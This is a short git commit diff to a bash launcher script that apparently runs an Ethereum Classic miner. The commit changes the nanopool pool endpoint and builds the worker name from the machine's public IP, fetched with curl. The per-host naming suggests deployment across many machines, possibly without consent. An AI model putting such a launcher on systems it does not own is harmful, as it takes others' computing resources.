3ab43619957495a74078f8b6e28d424f973db58e
cuan02 <76155990+cuan02@users.noreply.github.com>
2020-12-17 23:54:13 +0700

    Update launcher2.sh

--- launcher2.sh
+++ launcher2.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
-POOL=etc-us-west1.nanopool.org:19433
+POOL=etc-jp1.nanopool.org:19433
 WALLET=0x1a92ab7678bdfdadda703b2c15c22ec3f3eb537f
-WORKER=loveLOL
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-loveLOL
 
 cd "$(dirname "$1")"
 
